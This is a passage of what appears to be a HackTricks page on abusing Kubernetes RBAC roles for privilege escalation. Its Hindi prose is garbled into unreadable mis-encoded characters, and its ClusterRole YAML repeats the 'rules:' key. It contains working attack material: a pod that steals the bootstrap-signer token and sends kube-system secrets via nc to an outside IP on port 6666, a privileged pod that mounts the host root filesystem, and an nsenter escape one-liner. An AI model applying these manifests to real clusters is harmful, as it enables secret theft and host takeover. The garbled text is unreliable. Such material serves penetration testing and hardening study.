# рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ рд░реЛрд▓/рдХреНрд▓рд╕реНрдЯрд░рд░реЛрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>

рдпрд╣рд╛рдВ рдЖрдк рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рдирд╛рдХ рд░реЛрд▓ рдФрд░ рдХреНрд▓рд╕реНрдЯрд░рд░реЛрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк `kubectl api-resources` рдХреЗ рд╕рд╛рде рд╕рднреА рд╕рдорд░реНрдерд┐рдд рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

## **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди**

рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ **рдЕрд▓рдЧ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреА рдХрд▓рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреЗ рд╣реБрдП (рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдореЗрдВ) рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ рдореВрд▓ рд░реВрдк рд╕реЗ **4 рдореБрдЦреНрдп рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ рдЬрд┐рдирдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдпрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**:

* рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣/рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХрд╛ **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдЬрд┐рдирдореЗрдВ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ
* рдкреЙрдб рдмрдирд╛рдиреЗ/рдкреИрдЪ рдХрд░рдиреЗ/рдПрдХреНрдЬрд╝реЗрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдвреВрдВрдврд╝рдиреЗ рдпрд╛ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ
* рд╕реАрдХреНрд░реЗрдЯ рдкрдврд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдХреНрдпреЛрдВрдХрд┐ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдЯреЛрдХрди рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ
* рдХрдВрдЯреЗрдирд░ рд╕реЗ рдиреЛрдбрд╝реЗ рдореЗрдВ рдмрдЪрдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдЬрд╣рд╛рдВ рдЖрдк рдиреЛрдбрд╝реЗ рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯ, рдиреЛрдбрд╝ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░, рдФрд░ рдиреЛрдбрд╝ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)
* рдПрдХ рдкреЙрдб рдореЗрдВ рдкреЛрд░реНрдЯ-рдлрд╝реЛрд░рд╡рд░реНрдб рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕ рдкреЙрдб рдХреЗ рднреАрддрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### **рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдпрд╛ рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб)**

рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖рдХрд░ рдпрджрд┐ рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдПрдХ "рдХреНрд▓рд╕реНрдЯрд░рд░реЛрд▓" рд╣реИ рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИ рдФрд░ рдЙрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдорд╛рд▓рд┐рдХ рдмрдирддрд╛ рд╣реИред
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪ**

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪ рджреЗрдирд╛ рдмрд╣реБрдд рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред рд▓реЗрдХрд┐рди, **рдХреМрди рд╕реЗ рдХреНрд░рд┐рдпрд╛рдПрдБ** рдЗрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рджреЗрддреА рд╣реИрдВ? рдпрд╣рд╛рдВ рдХреБрдЫ рдЦрддрд░рдирд╛рдХ RBAC рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рдЬреЛ рдкреВрд░реЗ рдХреНрд▓рд╕реНрдЯрд░ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреА рд╣реИрдВ:

* **resources: \["\*"] verbs: \["create"]** - рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди, рдЬреИрд╕реЗ рдХрд┐ **рдкреЙрдбреНрд╕**, рд░реЛрд▓реНрд╕ рдЖрджрд┐ рдХреЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзреА рдЗрд╕реЗ **рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг **тАЬрдкреЙрдбреНрд╕ рдирд┐рд░реНрдорд╛рдгтАЭ рдЕрдиреБрднрд╛рдЧ** рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред
* **resources: \["\*"] verbs: \["list"]** - рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд▓реАрдХ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдирд╛ рдЖрд╕рд╛рди рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг **тАЬрд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреАрдмрджреНрдзрд┐тАЭ рдЕрдиреБрднрд╛рдЧ** рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИред
* **resources: \["\*"] verbs: \["get"]** - рдЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рд╕реЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### рдкреЙрдб рдмрдирд╛рдПрдВ - рдЯреЛрдХрди рдЪреЛрд░реА

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ "kube-system" рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдПрдХ рдЕрдЯреИрдХрд░ рдХреНрд░рд┐рдкреНрдЯреЛрдорд╛рдЗрдирд┐рдВрдЧ рдХрдВрдЯреЗрдирд░ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдХрд┐рд╕реА **рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЙрд╕ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдкреЙрдб рдЪрд▓рд╛рдХрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрд╣рд╛рдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо _bootstrap-signer_ рд╣реИ рдФрд░ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдХрд┐ рд╡рд╣ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХреЗред

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рджреБрд╖реНрдЯ рдкреЙрдб рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдлрд┐рд░, рд╕реЗрд╡рд╛ рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдпрд╣ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдПрдЧрд╛:

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
рдкрд┐рдЫрд▓реА рдЫрд╡рд┐ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _bootstrap-signer рд╕реЗрд╡рд╛_ `serviceAccountname`_ рдореЗрдВ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рддреЛ рдмрд╕ рдПрдХ рджреБрд╖реНрдЯ рдкреЙрдб рдмрдирд╛рдПрдВ рдФрд░ рдкреЛрд░реНрдЯ 6666 рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЙрдореНрдореАрдж рдХрд░реЗрдВ:

### **рдкреЙрдб рдмрдирд╛рдПрдВ рдФрд░ рдЫреВрдЯреЗрдВ**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рднрд╛рд╖рд╛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ:

* **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкрд╣реБрдВрдЪ** (рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдирд╛ рдФрд░ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛)
* **hostIPC рдФрд░ hostPid рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ** рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **hostNetwork рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ** рдЬреЛ рдиреЛрдб рдХреНрд▓рд╛рдЙрдб рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдмреЗрд╣рддрд░ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ
* **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдорд╛рдЙрдВрдЯ рд╣реЛрд╕реНрдЯ /**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

рдкреЙрдб рдмрдирд╛рдПрдБ:
```bash
kubectl --token $token create -f mount_root.yaml
```
рдЗрд╕ [рдЯреНрд╡реАрдЯ](https://twitter.com/mauilion/status/1129468485480751104) рд╕реЗ рдПрдХ-рд▓рд╛рдЗрдирд░ рдФрд░ рдХреБрдЫ рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рде:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
рдЕрдм рдЬрдм рдЖрдк рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рддрдХрдиреАрдХреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

#### рдЫрд┐рдкрд╛рд╡

рд╢рд╛рдпрдж рдЖрдк **рдЫрд┐рдкрд╛рд╡** рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХрд┐рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдк рдХреЗрд╡рд▓ рдкрд┐рдЫрд▓реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдПрдХ рдкреЙрдб рдмрдирд╛рддреЗ рд╣реИрдВ:

* **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ + hostPID**
* **рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_рдЖрдк_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _рдореЗрдВ рдкрд┐рдЫрд▓реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдкреЙрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдЙрджрд╛рд╣рд░рдг рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ_

### рдкреЙрдб рдмрдирд╛рдПрдВ - рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЬрд╛рдПрдВ

рдпрджрд┐ рдЖрдк рдПрдХ **рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ рдПрдХ **рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ**) рддреЛ рдЖрдк **рдХреНрд▓рд╛рдЙрдб рдорд╛рд╣реМрд▓ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ рдкреЙрдб рдпрд╛ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ **рдХреНрд▓рд╛рдЙрдб рд░реЛрд▓ рджреЗрдХрд░** рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗред
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк **рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рдиреЛрдб** рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА **IAM** рд░реЛрд▓ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ, рдбреЗрдордирд╕реЗрдЯреНрд╕, рд╕реНрдерд╛рдпреАрд╕реЗрдЯреНрд╕, рд░рд┐рдкреНрд▓рд┐рдХреЗрд╢рдирдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕, рд░рд┐рдкреНрд▓рд┐рдХрд╛рд╕реЗрдЯреНрд╕, рдЬреЙрдмреНрд╕ рдФрд░ рдХреНрд░реЙрдирдЬреЙрдмреНрд╕ рдмрдирд╛рдПрдВ/рдкреИрдЪ рдХрд░реЗрдВ**

рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ, рдбреЗрдордирд╕реЗрдЯреНрд╕, рд╕реНрдерд╛рдпреАрд╕реЗрдЯреНрд╕, рд░рд┐рдкреНрд▓рд┐рдХреЗрд╢рдирдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕, рд░рд┐рдкреНрд▓рд┐рдХрд╛рд╕реЗрдЯреНрд╕, рдЬреЙрдмреНрд╕ рдФрд░ рдХреНрд░реЙрдирдЬреЙрдмреНрд╕ рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрдпреЛрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрди рд╕рднреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреЙрдб рд╡рд┐рдХрд╕рд┐рдд рдХрд░рдирд╛ рдФрд░ рдкреЙрдб рдмрдирд╛рдирд╛** рд╕рдВрднрд╡ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ **рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ 